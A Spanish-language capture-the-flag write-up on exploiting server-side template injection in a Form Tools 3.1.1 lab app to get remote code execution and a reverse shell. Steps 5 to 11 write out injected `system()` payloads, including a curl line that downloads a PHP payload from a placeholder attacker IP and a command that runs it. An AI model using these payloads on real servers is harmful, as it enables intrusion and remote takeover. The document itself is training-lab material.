---
layout: apunte
title: "8. Extra-Mile Challenge"
---

Hay una aplicación web corriendo en `http://ssti.thm:8080/`. ¿Puedes conseguir RCE y leer el contenido del archivo de texto escondido en el directorio usando SSTI?

Credenciales de inicio de sesión:

- **Username:** `admin`
- **Password:** `admin`

---------------------------------------------
<h2>Challenge</h2>
1. Vamos a la página que nos dan.
   !**Pasted image 20260113125257.png**
2. Iniciamos sesión con las credenciales que nos dan.
   !**Pasted image 20260113125332.png**
3. Haciendo click en "FORM TOOLS" podemos ver que existe de verdad.
   !**Pasted image 20260113130356.png**
   Y también sabemos que la versión es la 3.1.1.
   !**Pasted image 20260113130429.png**
4. Buscando podemos encontrar que es vulnerable a RCE.
   !**Pasted image 20260113130637.png**
5. Probamos a ver dónde meter el payload (probamos donde dice el exploit primero).
	1. Para ello vamos a crear una nueva Form (Internal).
	   !**Pasted image 20260113131116.png**
	2. En "Views" le damos a "Add New Group".
	   !**Pasted image 20260113131256.png**
	3. Si le damos a update evalúa la expresión.
	   !**Pasted image 20260113131341.png**
	4. Vamos a probar con `{system('ls')}`.
	   !**Pasted image 20260113131609.png**
	   !**Pasted image 20260113131623.png**
	   Está ejecutando los comandos. Vamos a mandarnos una reverse shell.
6. Pegamos el payload en `payload.php`, por ejemplo.
   !**Pasted image 20260113132043.png**
7. Nos ponemos en escucha para servir el payload php.
   !**Pasted image 20260113131700.png**
8. Nos ponemos en escucha por el puerto que recibirá la shell (`9000`).
   !**Pasted image 20260113132201.png**
9. Introducimos el payload en el campo: `{system('curl http://NUESTRA_IP:8081/payload.php -o /tmp/payload.php')}`.
   !**Pasted image 20260113132431.png**
10. Recibimos la petición y la máquina víctima se guarda el payload.
    !**Pasted image 20260113132924.png**
11. Introducimos el siguiente comando: `{system('php /tmp/payload.php')}`.
    !**Pasted image 20260113133128.png**
12. Recibimos la shell.
    !**Pasted image 20260113134046.png**
13. Obtenemos la flag.
    !**Pasted image 20260113134211.png**

